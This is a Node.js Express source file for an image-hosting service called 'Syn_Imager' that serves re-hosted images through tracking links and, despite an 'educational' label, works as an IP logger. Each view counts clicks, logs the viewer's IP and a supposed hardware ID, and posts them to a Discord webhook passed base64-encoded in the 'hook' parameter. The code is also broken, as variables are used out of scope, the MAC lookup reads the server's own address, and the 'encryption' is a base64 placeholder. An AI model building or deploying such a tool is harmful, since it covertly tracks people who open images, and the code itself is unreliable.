const express = require('express')
const app = express()
const cors = require('cors')
const bodyParser = require('body-parser')
const uuidv4 = require('uuid').v4
const getmac = require('getmac')
const request = require('request-promise-native');
const axios = require('axios');
const sharp = require('sharp');


require('dotenv').config()
app.use(cors())
app.use(bodyParser.json())

const description = [[    "This is a simple image tracker for educational purposes, and will be used as a example of how to encrypt a image, and be able to get infomation and send it to a webhook"]]

const syn_config = {
    apiname: "Syn_Imager",
    preendpoint: "/host/image/",
    creator: "user"
}

const images = {}

app.post(syn_config.preendpoint + 'encrypt', async (req, res) => {
    // fetch and encrypt the image from the provided URL, and save it to the server
    const imageUrl = req.body.imageUrl;
    try {
        const imageBuffer = await request.get(imageUrl, { encoding: null });
        const id = uuidv4();
        const encryptedImage = encryptImage(imageBuffer);
        images[id] = {
            encryptedImage,
            clicks: 0
        }
        const imageURL = syn_config.preendpoint + 'content/raw/' + id
        console.log(`New Image Hooked Track it here: ${syn_config.preendpoint + "content/tracking/"+id}`)
        const trackinglink = `${syn_config.preendpoint}content/tracking/` + id
        res.status(200).send({ imageURL, trackinglink, id })
    } catch (err) {
        console.error(err);
        res.status(400).send({ error: 'Error fetching or encrypting image' });
    }
});


  

app.get(syn_config.preendpoint + 'content/tracking/:id', (req, res) => {
    // get the tracking information for an image
    const id = req.params.id
    if (images[id]) {
        const clicks = images[id].clicks
        res.status(200).send({ clicks, tracking: images[id].tracking })
    } else {
        res.status(404).send('Image not found')
    }
})

app.get("/", (req, res) => {
  res.send('Hello, world')
})


app.get(syn_config.preendpoint + 'content/raw/:id', async (req, res) => {
  const id = req.params.id;
  if (images[id]) {
    images[id].clicks += 1;

    const allowTracking = req.query.allowtracking === 'true';
    if (allowTracking) {
      const hwid = getmac.default();
      const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
      images[id].tracking = images[id].tracking || [];
      images[id].tracking.push({ hwid, ip });
    }

    const bytecode = req.query.hook;
    if (bytecode) {
      // Convert the bytecode to the actual Discord webhook URL
      const webhookUrl = Buffer.from(bytecode.split('/').slice(1).join(''), 'base64').toString();
      
      // Send the webhook with information about the image
      const message = `Image ${id || "N/A"} was clicked ${images[id].clicks} times. \n\nHWID: ${hwid || "N/A"}\nIP: ${ip || "N/A"}`;
      const data = {
        username: 'Image Hosting',
        avatar_url: 'https://example.com/avatar.png',
        content: message
      };
      await axios.post(webhookUrl, data);
    }

    // Decrypt the encrypted image data
    const decryptedBuffer = await decryptImage(images[id].encryptedImage);

    res.setHeader('Content-Type', 'image/png');
    res.send(decryptedBuffer);
  } else {
    res.status(404).send('Image not found');
  }
});



async function decryptImage(encryptedDataPromise) {
    // Wait for the promise to resolve and get the encrypted data
    const encryptedData = await encryptedDataPromise;
  
    // Decrypt the image using your decryption algorithm
    // This is just a placeholder
    const decryptedData = Buffer.from(encryptedData, 'base64');
    return decryptedData;
  }
  
  

async function encryptImage(image) {
    // If the image is a URL, fetch the image from the URL
    if (typeof image === 'string' && image.startsWith('https')) {
      const response = await axios.get(image, { responseType: 'arraybuffer' });
      image = response.data;
    }
  
    // Encrypt the image using your encryption algorithm
    // This is just a placeholder
    const encryptedData = image.toString('base64');
    return encryptedData;
  }
  



app.listen(3009, () => {
  console.log(`listening on 3009`)
})
